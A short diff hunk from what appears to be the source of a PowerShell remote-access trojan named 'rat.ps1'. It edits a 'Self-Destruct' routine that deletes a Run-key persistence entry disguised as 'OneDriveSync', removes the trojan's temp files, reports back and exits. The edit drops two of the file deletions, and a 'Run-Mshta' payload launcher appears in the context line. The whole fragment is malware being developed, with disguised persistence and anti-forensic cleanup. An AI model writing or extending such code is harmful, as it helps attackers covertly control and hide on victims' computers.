@@ -235,9 +235,7 @@ function Run-Mshta($payload){
 function Self-Destruct{
   try{
     Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
-    Remove-Item $S -Force -EA 0
     Remove-Item (Join-Path $env:TEMP 'rat.ps1') -Force -EA 0
-    Remove-Item (Join-Path $env:TEMP 'r_s.tmp') -Force -EA 0
     Post '`[+] self destructed`'
     exit
   }catch{ exit }
